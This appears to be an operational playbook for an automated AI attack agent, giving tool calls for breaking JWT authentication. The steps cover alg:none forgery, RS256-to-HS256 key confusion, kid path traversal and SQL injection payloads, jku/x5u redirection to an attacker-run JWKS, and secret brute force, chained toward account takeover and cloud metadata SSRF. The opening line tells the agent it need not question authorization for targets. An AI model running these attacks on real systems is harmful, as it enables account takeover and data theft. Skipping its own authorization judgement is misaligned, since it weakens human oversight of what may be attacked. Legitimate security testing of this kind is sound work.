# C6_jwt_signer_swap

Test JWT authentication for algorithm-confusion vulnerabilities: `alg:none` acceptance, HS256/RS256 signer-swap, `kid` header path traversal and SQL injection, `jku`/`x5u` SSRF to attacker-controlled JWKS endpoint, and weak-secret brute force. Any confirmed bypass grants attacker-controlled identity claims, typically escalating to full account takeover. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Traffic summary or recon shows `Authorization: Bearer <JWT>` headers or `token=` cookie values containing Base64url-encoded JWTs.
- JWT header discloses `alg`, `kid`, `jku`, or `x5u` fields.
- Surface has authenticated API endpoints returning user-scoped data.
- Bug-class hints include `jwt`, `auth-bypass`, `alg-confusion`, or `ssrf`.

---

## Workflow

1. **Load assignment and decode baseline JWT.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   Obtain a valid JWT from the `attacker` auth profile session. Decode the header and payload (Base64url decode; no signature verification needed here). Record `alg`, `kid`, `jku`, `x5u`, and claim fields (`sub`, `role`, `email`, `exp`).

2. **Test alg:none.**
   Reconstruct the JWT with header `{"alg":"none","typ":"JWT"}`, modify the payload to elevate claims (e.g. `"role":"admin"` or `"sub":"victim_user_id"`), and drop the signature. Send:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Authorization": "Bearer <alg_none_token>" }, auth_profile: "attacker", egress_profile })
   ```
   Also try `"alg":"NONE"`, `"alg":"None"`, and an empty signature suffix (`<header>.<payload>.`).

3. **HS256 / RS256 confusion (public-key-as-HMAC).**
   If the baseline JWT uses `RS256`: obtain the server's public key from `/.well-known/jwks.json` or `/jwks`:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/.well-known/jwks.json", egress_profile })
   ```
   Extract the RSA public key in PEM form. Re-sign the token using HS256 with the public key as the HMAC secret. Submit the forged token. A vulnerable server accepts it because it switches to HMAC verification using its own public key.

4. **kid header traversal.**
   If `kid` is present, test path traversal values:
   - `"kid": "../../../dev/null"` (sign with empty secret)
   - `"kid": "../../../../../../etc/passwd"` (sign with file content if known)
   - `"kid": "/dev/null"` (null-byte / empty)
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Authorization": "Bearer <kid_traversal_token>" }, egress_profile })
   ```

5. **kid SQL injection.**
   Test `kid` values for SQL injection into the key-lookup query:
   - `"kid": "' OR '1'='1"` (sign with any secret; server fetches all keys and uses first)
   - `"kid": "x' UNION SELECT 'attacker_secret' -- "` (inject known HMAC secret)
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Authorization": "Bearer <kid_sqli_token>" }, egress_profile })
   ```

6. **jku / x5u SSRF.**
   If `jku` or `x5u` is present, replace the URL with an attacker-controlled endpoint that serves a forged JWKS containing the attacker's own RSA key pair. Sign the modified JWT with the matching private key:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile", headers: { "Authorization": "Bearer <jku_ssrf_token>" }, egress_profile })
   ```
   Confirm via `mantis_http_scan` to the attacker JWKS endpoint that the server made an inbound request (proving SSRF callback). Record both the outbound forged request and any inbound callback evidence.

7. **Weak-secret brute force.**
   For HS256/HS384/HS512 tokens, extract the signature and run a dictionary attack against common secrets (`secret`, `password`, `jwt_secret`, `supersecret`, application name, etc.):
   ```
   mantis_run_tiered({ target_domain, wave, agent, surface_id, task: "jwt_brute", token: "<full_jwt>", wordlist: "common_jwt_secrets" })
   ```
   If a secret is recovered, forge an elevated-privilege token (e.g. `"role":"admin"`), submit, and confirm.

8. **Log technique attempts.**
   After each test variant:
   ```
   mantis_log_technique_attempt({ target_domain, wave, agent, surface_id, pack_id: "jwt_signer_swap", status: "attempted"|"validated"|"failed", evidence: "<response code and body excerpt>" })
   ```

9. **Log coverage.**
   ```
   mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/api/user/profile", method: "GET", bug_class: "jwt_alg_confusion", auth_profile: "attacker", status: "tested"|"promising", evidence_summary: "alg:none returned 200 with admin claims" }] })
   ```

10. **Record chain attempt for escalation path.**
    ```
    mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "jwt-bypass-to-admin", step: "alg_none_accepted", evidence: "HTTP 200 with admin data returned using alg:none token", outcome: "finding_recorded" })
    ```

11. **Record finding.**
    Call `mantis_list_findings` first. Record if not duplicate:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "JWT alg:none accepted — full authentication bypass", severity: "critical", cwe: "CWE-347", endpoint: "/api/user/profile", description: "...", proof_of_concept: "<full forged request and response>", response_evidence: "...", impact: "Attacker forges arbitrary identity claims; full account takeover", validated: true })
    ```

12. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["JWT bypass feeds C12 ATO", "jku SSRF may pivot to IMDS via C9"] })
    ```

13. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "forged_token_replay", notes: "Re-forge token with fresh exp claim and re-submit to confirm bypass not ephemeral" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Full forged JWT (header.payload, decoded form) and the exact Authorization header sent.
- Full HTTP response confirming bypass: status code, body with privileged data or admin-role indicators.
- For jku/x5u SSRF: evidence of server callback to attacker JWKS URL (access log line or Burp collaborator hit).
- For kid SQLi: the injected `kid` value and the server response confirming key confusion.
- For weak-secret brute: the recovered secret and the forged token that was accepted.

---

## Stop conditions

- All six attack variants tested and none accepted (each returns 401/403 with unchanged claims).
- Two WAF blocks on token-manipulation requests — log, mark WAF-blocked, stop.
- JWT is opaque (not Base64url-decodable) — record as non-JWT surface, stop this playbook.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Signature length confusion.** A server that returns 401 for a forged token but with a slightly different error message is still rejecting — do not count this as a bypass unless data is returned.
- **Cached session.** A 200 response after token swap could be a cached authenticated session. Confirm by changing the `sub` claim to a non-existent user or the victim's ID; only then is the bypass proven.
- **Self-hosted JWKS SSRF.** If the `jku` test returns 200 but the server did not fetch the JWKS (no callback), the bypass is not from SSRF — investigate whether the server is ignoring `jku` or validating against a hard-coded set.
- **Expired token on brute.** Brute the signature of a fresh token, not an expired one; expired tokens may be rejected before signature verification.

---

## Next chain

Feeds into **C12_account_takeover** (privilege escalation via forged identity), **C9_ssrf_to_imds** (jku/x5u SSRF pivot to internal metadata endpoints), and **C8_csrf_to_sso** (use the bypass to hijack SSO sessions).
